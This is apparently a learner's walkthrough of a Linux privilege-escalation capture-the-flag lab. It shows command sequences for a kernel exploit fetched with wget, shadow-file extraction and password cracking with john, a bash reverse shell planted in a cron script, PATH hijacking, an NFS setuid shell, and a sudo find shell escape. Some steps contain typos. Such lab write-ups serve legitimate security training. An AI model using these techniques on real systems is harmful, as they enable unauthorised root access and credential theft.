## TASK 3 - ENUMERATION
This task is pretty straight-forward. Just run some commands and you'll be all set. Let's see, shall we?

	uname -a
For kernel version

	cat /etc/os-release
OR instead of `cat`

	lsb_release -a
And for python version

	python -V
Above are 3 separate commands (cat & lsb will do the same job!) you can run individually, or you can just run them all together, it'll give you your required answers for all except last question. To find it's answer, you gotta research.

HINT:
>Try researching on [ExploitDB](https://www.exploit-db.com/), with EXACT details of os from `uname -a`  or from `cat` or from `lsb_release -a` command.

Before you move onto next task, `find` the `-name` of file `flag1.txt` before-hand, if you understand my hint 😏. It has flag for [[#TASK 5 - KERNEL EXPLOIT]], **but not that easy to just `cat` it huh!**

## TASK 5 - KERNEL EXPLOIT

This one might look easy but is somewhat moderately difficult if you haven't done some of the things mentioned here, like **setting up a `SimpleHTTPserver` using python module and `wget`**.
Anyways, either you can download the **required exploit** found from [[#TASK 3 - ENUMERATION]] or simply use `searchsploit` to find it locally on your `kali-linux`, because you `probably have it by default`.

Move it to your `/home/kali` i.e. default home location, so that it's easy for you later on. Once doing that setup the `http-server` by running this command-

	python -m http.server
Default port is `8000` but, if you want, you can run it on port such as `9000` or any other which supports running server on it, by adding it in the end like -

	python -m http.server 9000
And that's all set!

Now get back to your `karen` terminal, where you are logged in, and use `wget` to download the exploit on the target machine by doing this -
>wget http://\<Attack-Box IP\>:port/exploit_file

If you did all good till here, your target machine will download the exploit!
Now that your exploit is ready, **DON'T RUN IT YET, YOU MORON!** First read the exploit on [ExploitDB](https://www.exploit-db.com/) about how to use it! In the comments before code, it clearly says how to run it, which is these step in order -
> uname -a

To get your Linux details once again,
> gcc <exploit_name>.c -o ofs

The above command will compile the exploit which is in `C-Language` into a file named `ofs`. Now if you run `id` command, you'll see that `karen` is not *among the root users group*.
But once you run this -

	./ofs
You'll the command execute and complete and once that is done, you'll see the terminal change from `$` to `#`. Now run the `id` command again and you'll see that *now you belong to root group*.

Now that you are a root user, `cat` the flag file `flag1.txt` you found earlier! Done
## TASK 6 - EXPLOIT WITH SUDO
#sudo
This task was not much of challenge(in my case, at least). No need for any particular exploit or something. First up we run -

	sudo -l
To list what commands **we can** run with `sudo`.
If you check users in `/home` direc, there's just one, which has flag, which can be seen with `cat` without any need for `sudo`. Next is the nmap one, which is not really a challenge. Just do some research or read the `man` page for nmap, you'll find the answer.
As for *hash of frank's password*, this you can see by running -

	sudo less /etc/shadow
since you can't see system files with `cat` because it cannot be used with `sudo`, so, there's that 😉

## TASK 7 - SUID/SGID EXPLOIT

[ NOTE: Start each machine separately. They are not meant do be done within same target machine. Each target machine has it's own separate data and vulnerabilities! ]

This was an absolute pain, not because it was tricky, but because it was very manual, and repetitive. Anyways here's how its done,

	cat /etc/passwd
should show you the first answer for this question, since it's a pretty `unique user` (there goes your hint!), also, make your life easier and `scp` this file on your local attack box or whatever you are using(**trust me, you're so gonna need it!**).

Now for passwd for `user 2` or, in case you want passwd for all the antique users, this is how its gonna be, since you can't use any command other than `nano` to view, it's a problem.
To cross this obstacle, what you can do is, use `base64` encryption-decryption, simultaneously, to view the `/etc/shadow` file in a manner where you can at least copy it's contents. (Life's pain, especially when you can't `scp` one file(passwd), but not the other(shadow)!)
Once you do that, paste those contents in a file which you can create locally on your attack-box. You can name it `shadow`, like I did, or whatever you wish.
Now to `unshadow` these files, and join their content into a single file, I did this,

	unshadow passwd shadow > passwords.txt
where -
- passwd - file from `scp`
- shadow - content I copied into a locally created file
- passwords.txt - the file in which I'm joining the previous 2 files content by `unshadowing` it!
> The `unshadow` command in Kali Linux is a tool used to combine the `/etc/passwd` and `/etc/shadow` files of the current system or two arbitrary shadow and password files.

Resultant creates a `passwords.txt` file, which then we push into `JohnTheRipper`, (oh hells yeah, this here is cool part!), which will then give us passwords to the users from `Q1` and `user2`

	john passwords.txt
Nothing fancy, just use `john` and give it the hash to crack. You'll get the passwords! Once done, get into any user, I did it with `gerryconway`, you can try with `user 2`, with the `su` command, and inside that user, search for `flag3.txt` file.
Now that you are here, you still won't be able to read the flag! Why? **Because the users are bloody-useless and don't even exist in `sudoers` group**(the group that is allowed to use `sudo` command)! Now what? Nothing, just like before....

	/usr/bin/base64 /home/ubuntu/flag3.txt | /usr/bin/base64 -d
And here you're done with this task! \*Phew, what a pain!

## TASK 8 - CAPABILITIES
The purpose of this task was to merely give an introductory understanding of how `capabilities` work, like the general idea, with some useful commands to practice it.
Rest was pretty standard! When you run this command on the target's terminal -

	getcap -r / 2>/dev/null
which does following:
- **`getcap`**: This command is used to get the capabilities of files.
- **`-r`**: This option tells `getcap` to operate recursively. It will search through all directories and subdirectories starting from the specified directory.
- **`/`**: The directory from which to start the search. In this case, `/` refers to the root directory, meaning it will search the entire filesystem.
- **`2>/dev/null`**: This part of the command redirects standard error (file descriptor 2) to `/dev/null`, effectively discarding any error messages that might be generated during the search.
This'll give you your 2nd & 3rd answer.
As for last, it's again `textbook`. Look for the file and just `cat` it, you'll get your flag.

## TASK 9 - CRON JOBS
#cron 
This one was MAX PAIN! 😅Anyways, took some time but here it is...
- First up, once we login as target with `ssh`, we check the `/etc/crontab` file for running `cron jobs`. There comes our first answer
- But to get the flag we need to *have root access*. For that, in this specific task, we use a cron task that we have access to, in our case, a `backup.sh` file. (A shell script file, nice!)
- Whatever content it has, don't matter, but before that, we'll come back to our terminal and open up a `netcat` listener on port... `6666` let say,

		nc -lvp 6666
- Once done that, we go back to target, change the content of `backup.sh` to:

		#!/bin/bash
		bash -i >& /dev/tcp/<THM-IP>/6666 0>&1
- After changing the content, give this file execution permission with this:

		chmod +x backup.sh
- Here now we just wait at `nc` listener to open up a reverse-shell &  **BOOM!**. It's done. Here you `cat` the flag, and *collect/copy the passwd of user* `matt` for the next question is for `matt's password`.
- Now you have a saved file containing `matt's` password **hash**, open up a terminal in the same location as the file and run a `JohnTheRipper` like this:

		john matt.txt
- I wrote ***matt.txt*** because that's how I saved the file and here we are, **done with our TASK 9**.

# TASK 10 - PATH
#env 
Okay first up, this room is messed up. You need to have an exceptional level of clarity of what this room is trying to say and do, **with** your own itty-bitty research.
Here's what I got:
-  First question is pretty straight forward, even if you don't run those `find` command from task like:

	`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
**First of all**, it probably might not run, **second**, you can see with your own eyes that you CAN go into the `unique` folder. (I won't tell till deemed necessary!)

The exploitation itself it pretty gnarly. You can do all the things as said in demo and all but it won't work. But what ***will*** work is this:
- go to your `/home/murdoch` direc
- once check your `PATH` by running this

		echo $PATH
- now run export your `pwd` as `PATH` by doing this:

		exoprt PATH=/home/murdoch:$PATH
- Now, if you'll the `echo $PATH` command again, you'll see your directory in the PATH variables.
- Now run these commands:

		echo "/bin/bash" >> thm
		chmod 777 thm
		./test
- And ***BLAM!*** you have your root access!

Here's how it happened:
- the file that you have named as `test` is a **KIND OF BINARY** I guess, 🤷🏻‍♂️ (idk, I tried looking into it, and it said this
> 	setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1724ca90b94176ea2eb867165e837125e8e5ca52, for GNU/Linux 3.2.0, not stripped
idk what it means but any ways).

But it is basically the script we are going to run.
- the `chmod` command gave `thm` full read, write and execution permission.
- `./test` command ran our binary.

That's pretty much it for this task. You got your root access as soon as you ran the binary!
I'd highly suggest you celebrate if you did this room on your own, or even if it took you hours to do it, but you didn't give up! Celebrate your perseverance.

# TASK 11 - NFS
#network #nfs
This task was nowhere near easy, that I can assure! It's partially my fault as well that I had to tough it out through this room. If you don't face any technical problems at your end, you might not be as tired as I was. Here's how I did:
- Before anything, I mounted my `shared direc` on the `ubuntu` and **not `/home/backup`**.
- Do as the task did, except for the `C Code`, it's not as shown in the picture. This is the correct one-

		#include <stdio.h>
		#include <stdlib.h>
		#include <unistd.h>
		int main (void){
			setuid(0);
			setgid(0);
			system("/bin/bash");
			return 0;
		}
- This is the correct exploit.
- Rest is pretty much text book, just follow through and it'll be done.

Once you're in, you can look into all folders and find your flag!

# TASK 12 - CAPSTONE CHALLENGE
This challenge here is like a test of our learning. Here's how I did it!
- First up, you're logged in as the person said, you don't have any kind of privilege, so not much to see around **except**... what you can do is this -

		LFILE=/etc/shadow
		base64 "$LFILE" | base64 --decrypt
- What this'll do is, show you the `/etc/shadow` file, which you cannot see otherwise. (It's kind of a loophole!)
>Here, you'll see hashes for mainly 2 users, `missy` and `root`. So getting this file is kinda important.

- You need to copy contents of `/etc/passwd` file as well.
- Once you have contents of both files, `shadow` AND `passwd` we'll use the `unshadow` command with `john` to decrypt the hashes, like this -

		unshadow shadow passwd > paswd_hash.txt

- This will create the combined file of both. Then

		john paswd_hash.txt
- **This'll crack you the passwd to user `missy`, not root because we ain't living life on easy mode**! But I will share a trick somewhere, although that's not the point of this room. **Point is to become higher privilege user!**
- Once you get those credentials, login as user `missy` and you can look around all you want, you can't see the flag yet! But what you do have now, are **`sudo privileges`**.
- Next run this command, and you are set -

		sudo find . -exec /bin/sh \; -quit

Technically what this means is this:
1. **`sudo`**: This runs the command with elevated (superuser) privileges.
    
    - Purpose: To ensure the command has the necessary permissions to access all files and directories.
2. **`find`**: This is a command-line utility used to search for files and directories in a directory hierarchy.
    
    - Purpose: To search for items starting from the current directory (`.`).
3. **`.`**: This specifies the starting point for the search.
    
    - Purpose: To start searching from the current directory.
4. **`-exec`**: This option allows you to execute a command on each file or directory found by `find`.
    
    - Purpose: To run a specified command on each item found.
5. **`/bin/sh`**: This specifies the command to be executed.
    
    - Purpose: To open a new shell (`sh`).
6. **`\;`**: This marks the end of the command to be executed with `-exec`.
    
    - Purpose: To indicate the end of the command executed by `-exec`.
7. **`-quit`**: This tells `find` to stop searching after the first match.
    
    - Purpose: To stop the search after executing the command once.

-----------------------------------------------------------------
And that'll be it for this challenge and for this room! Do the things such as like, share, or comment out your opinion, or whatever its done here!
**Stay classy!**

# PEACE
-----------------------------------------------------------------